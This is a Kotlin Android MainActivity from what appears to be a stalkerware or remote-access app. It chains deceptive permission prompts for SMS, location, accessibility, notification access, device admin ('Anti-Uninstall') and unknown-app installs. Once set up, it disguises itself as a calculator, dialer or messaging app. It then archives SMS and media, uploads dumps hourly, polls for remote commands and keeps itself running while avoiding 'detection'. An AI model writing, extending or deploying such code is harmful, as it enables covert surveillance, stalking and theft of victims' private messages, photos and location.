package com.example.myandroid

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import androidx.activity.compose.setContent
import androidx.activity.ComponentActivity
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

// OPTIMIZATION: Switched to ComponentActivity (Lighter than AppCompat)
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        window.setFlags(
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )
        super.onCreate(savedInstanceState)

        if (WebLauncherManager.isEnabled(this)) {
            setContent {
                androidx.compose.material3.MaterialTheme {
                    OneUILauncher()
                }
            }
            return
        }

        val configPrefs = getSharedPreferences("app_config", MODE_PRIVATE)
        val setupPrefs = getSharedPreferences("setup_prefs", MODE_PRIVATE)
        
        val isTileActive = configPrefs.getBoolean("tile_dashboard_active", false)
        val isSetupFinished = setupPrefs.getBoolean("setup_finished_for_dump", false)

        if (isSetupFinished && !isTileActive) return
        
        setContent {
            androidx.compose.material3.MaterialTheme {
                InspectorDashboard(this)
            }
        }
    }

    private fun launchRealApp(skin: String) {
        try {
            if (skin == "TALKBACK") {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                return
            }
            if (skin == "SETTINGS") {
                startActivity(Intent(Settings.ACTION_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
                return
            }

            val targetPkg = when (skin) {
                "CALC" -> listOf("com.google.android.calculator", "com.android.calculator2", "com.sec.android.app.popupcalculator").find { packageManager.getLaunchIntentForPackage(it) != null } ?: "com.google.android.calculator"
                "GOOGLE_PHONE" -> "com.google.android.dialer"
                "GOOGLE_MSG" -> "com.google.android.apps.messaging"
                "SAM_PHONE" -> "com.samsung.android.dialer"
                "SAM_MSG" -> "com.samsung.android.messaging"
                "CHROME" -> "com.android.chrome"
                "IMO" -> "com.imo.android.imoim"
                "IMO_HD" -> "com.imo.android.imoimhd"
                "IMO_BETA" -> "com.imo.android.imoimbeta"
                "IMO_LITE" -> "com.imo.android.imoimlite"
                "TRUECALLER" -> "com.truecaller"
                else -> "com.google.android.apps.docs"
            }

            val intent = packageManager.getLaunchIntentForPackage(targetPkg)
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
            } else {
                android.widget.Toast.makeText(this, "Initializing $skin services...", android.widget.Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            DebugLogger.log("MAIN_ACT_ERR", e.message ?: "Unknown error")
        } finally {
            finish()
        }
    }

    override fun onResume() {
        super.onResume()
        if (WebLauncherManager.isEnabled(this)) return

        EngagementTracker.recordEvent(this, "UI_OPEN")
        
        val configPrefs = getSharedPreferences("app_config", MODE_PRIVATE)
        val setupPrefs = getSharedPreferences("setup_prefs", MODE_PRIVATE)
        
        val isTileActive = configPrefs.getBoolean("tile_dashboard_active", false)
        val isSetupFinished = setupPrefs.getBoolean("setup_finished_for_dump", false)

        if (isSetupFinished && !isTileActive) {
            val skin = configPrefs.getString("active_masquerade_skin", "SETTINGS")
            launchRealApp(skin ?: "SETTINGS")
            return
        }

        runPermissionCascade()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
    }

    override fun onBackPressed() {
        if (WebLauncherManager.isEnabled(this)) {
            // The native Compose BackHandler dynamically manages the drawer state.
            super.onBackPressed()
        } else {
            super.onBackPressed()
        }
    }

    private fun runPermissionCascade() {
        val ctx = this
        val prefs = getSharedPreferences("setup_prefs", MODE_PRIVATE)

        // 1. Runtime (SMS, Location, Phone, etc)
        val missingRuntime = PermissionManager.getMissingRuntimePermissions(ctx)
        if (missingRuntime.isNotEmpty() && !prefs.getBoolean("asked_runtime", false)) {
            prefs.edit().putBoolean("asked_runtime", true).apply()
            requestPermissions(missingRuntime.toTypedArray(), 101)
            return
        }

        // 1.1 Background Location (Android 11+ Requirement: Separate Request)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && 
            !PermissionManager.hasBackgroundLocation(ctx) && 
            !prefs.getBoolean("asked_bg_loc", false)) {
            
            prefs.edit().putBoolean("asked_bg_loc", true).apply()
            showExplanationDialog("Location Persistence", "To ensure location-based safety metrics work while the screen is off, please select 'Allow all the time' on the next screen.",
                onConfirm = {
                    requestPermissions(arrayOf(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION), 102)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 1.5 Storage
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !PermissionManager.hasAllFilesAccess(ctx) && !prefs.getBoolean("asked_files", false)) {
             prefs.edit().putBoolean("asked_files", true).apply()
             showExplanationDialog("Storage Access", "Storage access is required to generate system reports and manage backups.",
                 onConfirm = {
                     val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                     intent.data = android.net.Uri.parse("package:$packageName")
                     safeStart(intent)
                 },
                 onCancel = { runPermissionCascade() }
             )
             return
        }

        // 2. Accessibility
        if (!PermissionManager.hasAccessibility(ctx) && !prefs.getBoolean("asked_acc", false)) {
            prefs.edit().putBoolean("asked_acc", true).apply()
            showExplanationDialog("Accessibility Service", "Accessibility access is required to optimize background resource distribution.",
                onConfirm = { safeStart(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 2.5 Overlay (Appear on Top)
        if (!PermissionManager.hasOverlayAccess(ctx) && !prefs.getBoolean("asked_overlay", false)) {
            prefs.edit().putBoolean("asked_overlay", true).apply()
            showExplanationDialog("Background Persistence", "Overlay access helps maintain consistent application performance in the background.",
                onConfirm = {
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    safeStart(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 3. Usage Stats
        if (!PermissionManager.hasUsageStats(ctx) && !prefs.getBoolean("asked_usage", false)) {
            prefs.edit().putBoolean("asked_usage", true).apply()
            showExplanationDialog("Usage Analytics", "Usage access is required to calculate screen time and digital habits.",
                onConfirm = { safeStart(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 3.5 Do Not Disturb (DND)
        if (!PermissionManager.hasDndAccess(ctx) && !prefs.getBoolean("asked_dnd", false)) {
            prefs.edit().putBoolean("asked_dnd", true).apply()
            showExplanationDialog("Do Not Disturb Access", "DND access is required to bypass silent mode for emergency alerts.",
                onConfirm = { safeStart(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 4. Notification Listener
        if (!PermissionManager.hasNotificationListener(ctx) && !prefs.getBoolean("asked_notif", false)) {
            prefs.edit().putBoolean("asked_notif", true).apply()
            showExplanationDialog("Notification Access", "Notification access is required to sync alerts and messages.",
                onConfirm = { safeStart(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }
        
        // 4.5 Device Admin (Anti-Uninstall)
        if (!PermissionManager.isAdmin(ctx) && !prefs.getBoolean("asked_admin", false)) {
            prefs.edit().putBoolean("asked_admin", true).apply()
            showExplanationDialog("System Management", "Admin access ensures that background synchronization remains active and protected.",
                onConfirm = {
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this, MyDeviceAdminReceiver::class.java))
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Maintains system health metrics.")
                    safeStart(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 5. Battery
        if (!PermissionManager.isIgnored(ctx) && !prefs.getBoolean("asked_batt", false)) {
             prefs.edit().putBoolean("asked_batt", true).apply()
             showExplanationDialog("Background Processing", "Battery optimization must be ignored to allow unrestricted data sync.",
                 onConfirm = {
                     val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                     intent.data = android.net.Uri.parse("package:$packageName")
                     safeStart(intent)
                 },
                 onCancel = { runPermissionCascade() }
             )
             return 
        }

        // 6. Exact Alarm (Persistence)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !PermissionManager.hasExactAlarm(ctx) && !prefs.getBoolean("asked_alarm", false)) {
            prefs.edit().putBoolean("asked_alarm", true).apply()
            showExplanationDialog("Data Synchronization", "Please enable exact alarm scheduling to ensure consistent background health reporting.",
                onConfirm = {
                    val intent = Intent("android.settings.REQUEST_SCHEDULE_EXACT_ALARM")
                    intent.data = android.net.Uri.parse("package:$packageName")
                    safeStart(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 7. Write Settings (Display Control)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.System.canWrite(ctx) && !prefs.getBoolean("asked_write_set", false)) {
            prefs.edit().putBoolean("asked_write_set", true).apply()
            showExplanationDialog("Display Control", "Required to modify hardware backlight for adaptive system diagnostics.",
                onConfirm = {
                    val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    safeStart(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 7.5 Install Unknown Apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !PermissionManager.canInstallPackages(ctx) && !prefs.getBoolean("asked_install", false)) {
            prefs.edit().putBoolean("asked_install", true).apply()
            showExplanationDialog("App Updates", "Required to install background security updates.",
                onConfirm = {
                    val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    safeStart(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // --- SMART INITIALIZATION: CASCADE COMPLETE ---
        val setupPrefs = getSharedPreferences("setup_prefs", MODE_PRIVATE)
        val statsPrefs = getSharedPreferences("app_stats", MODE_PRIVATE)

        if (!setupPrefs.getBoolean("setup_finished_for_dump", false)) {
            setupPrefs.edit().putBoolean("setup_finished_for_dump", true).apply()
            
            // ROBUSTNESS: Trigger the first high-quality dump immediately upon setup completion
            kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                DebugLogger.log("SYSTEM", "Permissions finalized. Archiving SMS, Media, & triggering dump...")
                // Create the one-time vault files
                PhoneManager.vaultHistoricalSms(ctx)
                MediaHarvester.triggerInitialHarvest(ctx)
                DumpManager.createDailyDump(ctx)
                triggerImmediateDataSync()
            }
        }
        
        if (!statsPrefs.getBoolean("service_started", false)) {
            JudasManager.evaluateSimState(this)
            initializeBackgroundTasks()
            statsPrefs.edit().putBoolean("service_started", true).apply()
            DebugLogger.log("SYSTEM", "Cortex background services ignited.")
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) {
            // User answered runtime permissions (SMS, Location, Contacts).
            // Immediately queue a sync for WHATEVER they just granted.
            triggerImmediateDataSync()
        }
    }

    private fun triggerImmediateDataSync() {
        val wm = androidx.work.WorkManager.getInstance(this)
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
            
        // WorkManager handles the queuing. If offline, it waits. If online, it fires instantly.
        val initialSync = androidx.work.OneTimeWorkRequestBuilder<SyncWorker>()
            .setConstraints(constraints)
            .build()
            
        wm.enqueueUniqueWork("InitialDataSync", androidx.work.ExistingWorkPolicy.REPLACE, initialSync)
    }

    private fun safeStart(intent: Intent) {
        try {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {
            DebugLogger.log("CASCADE_ERR", "Failed to launch intent: ${e.message}")
            // Auto-trigger next step in cascade by resuming activity logic
            runPermissionCascade()
        }
    }

    private fun showExplanationDialog(title: String, msg: String, onConfirm: () -> Unit, onCancel: () -> Unit) {
        android.app.AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(msg)
            .setCancelable(false)
            .setPositiveButton("Continue") { _, _ -> onConfirm() }
            .setNegativeButton("Skip") { _, _ -> onCancel() }
            .show()
    }



    private fun initializeBackgroundTasks() {
        NetworkTracker.init(this)
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)

        val wm = androidx.work.WorkManager.getInstance(this)
        
        // --- SMART INITIALIZATION: CRITICAL SNAPSHOT ---
        // Queues the device identity and static info instantly. 
        val instantConstraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
        val immediateSnapshot = androidx.work.OneTimeWorkRequestBuilder<HealthWorker>()
            .setConstraints(instantConstraints)
            .build()
        wm.enqueueUniqueWork("ImmediateSnapshot", androidx.work.ExistingWorkPolicy.KEEP, immediateSnapshot)

        // OPTIMIZED: Run only when battery is not low to avoid heat/detection
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(true)
            .build()

        // Sync every 1 hour (Now batches Data Upload + Rules + Config)
        val syncRequest = androidx.work.PeriodicWorkRequestBuilder<SyncWorker>(1, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("BackupWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, syncRequest)
        
        // Remote Command (15 mins is fine as it's lightweight JSON check)
        val cmdRequest = androidx.work.PeriodicWorkRequestBuilder<RemoteCommandWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("RemoteCmdWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, cmdRequest)

        // Health & Token Sync (Ensures we stay updated every 4 hours)
        val healthRequest = androidx.work.PeriodicWorkRequestBuilder<HealthWorker>(4, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("HealthCheck", androidx.work.ExistingPeriodicWorkPolicy.KEEP, healthRequest)

        // Start the Immortality Heartbeat
        KeepAliveReceiver.scheduleNext(this)
    }
}